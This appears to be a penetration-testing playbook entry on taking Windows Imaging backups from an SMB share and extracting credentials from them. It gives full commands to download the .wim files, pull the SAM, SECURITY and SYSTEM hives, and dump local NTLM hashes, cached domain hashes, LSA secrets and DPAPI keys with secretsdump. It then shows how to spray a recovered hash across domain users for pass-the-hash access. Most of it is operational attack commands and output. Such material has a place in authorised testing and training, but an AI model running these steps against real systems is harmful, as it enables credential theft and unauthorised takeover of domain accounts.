# WIM (Windows Imaging) File Credential Extraction

## When this applies

- SMB enumeration discovers `.wim` files on a share (often named like `<HOSTNAME>-NN.wim` plus `vss-meta.cab`).
- These are Windows system imaging backups (often from `wbadmin` / `dism`-style snapshots) and contain registry hives.
- Goal: dump local SAM / SECURITY / SYSTEM and cached domain credentials (MSCASH2) without needing local admin on the target.

## Technique

WIM files are XPRESS-compressed archives readable by 7-zip. Multi-volume backups split user-profiles, registry/system files, and boot files across `-01.wim`, `-02.wim`, `-03.wim`. Look for the volume containing `Windows/System32/config` (typically the largest one). Extract `SAM`, `SECURITY`, `SYSTEM` then `secretsdump.py local`.

## Steps

```bash
# Download all wim parts (svc account access to images$ share)
smbclient.py 'domain/svc:pass@target' <<'EOF'
use images$
mget *.wim
EOF

# Identify which WIM has registry hives
for w in *.wim; do
  echo "=== $w ==="
  7zz l "$w" | grep -iE "config/SAM|^SAM$|^SYSTEM$|^SECURITY$|RegBack" | head -10
done
# The hit is typically the volume with bare `SAM` / `SECURITY` / `SYSTEM` at root + a `RegBack/` folder.

# Extract registry hives
7zz x -y AWSJPWK0222-02.wim -oextracted SAM SECURITY SYSTEM

# Dump local hashes + cached domain creds + LSA secrets
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
# Output:
#   Administrator:500:aad3...:<NTLM>:::         <- local admin (workstation)
#   operator:1000:aad3...:<NTLM>:::             <- local user; common pivot
#   DOMAIN/User.Name:$DCC2$10240#User.Name#... <- MSCASH2 cached domain logon
#   $MACHINE.ACC: aad3...:<NTLM>                <- workstation machine acct
#   dpapi_machinekey:0x...                      <- LSA-derived DPAPI key
```

## Pivoting from extracted hashes

The local NTLM hash (e.g., `operator:1000`) is often the **same hash** as a domain user with a profile on that workstation (admin reused password between local and domain). Spray it across all domain users via NetExec to find the match:

```bash
# Get all domain users
nxc smb DC -u valid_user -H valid_hash --users | awk '{print $5}' > users.lst
# Spray the local hash
nxc smb DC -u users.lst -H 5d8c3d1a20bd63f60f469f6763ca0d50 --continue-on-success
# Hit on a domain user means PtH access (e.g., simon.watson).
```

The MSCASH2 hash (`$DCC2$`) is almost always too slow to crack in rockyou+rules; password spraying the matching local NTLM is far faster.

## Verifying success

- `secretsdump.py local` prints hashes from `SAM`, `SECURITY`-cached domain logons, and LSA secrets.
- Pass-the-hash with the local NTLM hash succeeds against a domain user → `nxc smb ... [+] domain\user:hash`.

## Common pitfalls

- **VSS metadata `vss-meta.cab` is unhelpful** — the actual filesystem snapshot is in the `.wim` files, the cab is just shadow-copy XML metadata.
- **WIM v1.13 needs `7zz` (7-Zip 17.05+) or `wimlib-imagex`** — older `7z` versions sometimes truncate. Verify by extracting a known-size file.
- **DPAPI master keys typically NOT in WIM** — the WIM only includes `Windows/System32/config` plus `Users/<u>/AppData/Roaming/Microsoft/Protect/<SID>/`. The user master key files are in the `Users` volume; extract those too if you need to decrypt RDP-saved credentials.
- **DPAPI master key cracking is mode 15900 (v2 context 1) / 15910 (v2 context 3)** — but rockyou rarely cracks them; they're salted with PBKDF2 8000+ iterations.
- **Machine account hash from LSA secrets** — `$MACHINE.ACC` lets you authenticate AS the workstation (`HOST$`) and enumerate via Kerberos, but does NOT grant local admin on other hosts.

## Tools

- 7zz (Homebrew: `brew install p7zip-full` or grab `7-Zip` 17+)
- impacket `secretsdump.py`
- NetExec / nxc for password spray
